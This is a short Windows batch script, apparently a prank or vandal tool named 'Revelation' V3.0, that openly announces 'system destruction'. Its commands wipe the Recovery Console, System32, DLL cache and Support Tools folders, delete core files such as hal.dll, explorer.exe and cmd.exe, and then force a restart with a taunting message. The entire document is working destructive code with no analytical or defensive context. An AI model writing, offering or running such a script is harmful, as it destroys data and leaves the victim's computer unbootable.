echo off
cls
@echo Revelation startup...
@ECHO (Version)
@echo V3.0
@echo (Designated system)
@echo {Needs Insert Enviroment Varible}
@echo Revelation successfully started.
@Echo To begin system destruction
@pause
@CD c:\CMDCONS\
@DEL *.*
@CD SYSTEM32
@DEL *.*
@cls
@CD C:\PROGRAM FILES\SUPPORT TOOLS\
@DEL *.*
@cls
@cd %systemroot%
@del system
@cls
@cd system32
@del explorer.exe
@del cmd.exe
@del command.com
@DEL *.EXE
@del hal.dll
@del config.nt
@CD DLLCACHE
@DEL *.*
@cls
@echo You will have 30 seconds to escape after pressing any key.
@pause
@echo Timer started.
@echo Run.
@echo Now.
@echo In the general direction of the exit.
@shutdown -r -c "The end is coming-this is the revelation."
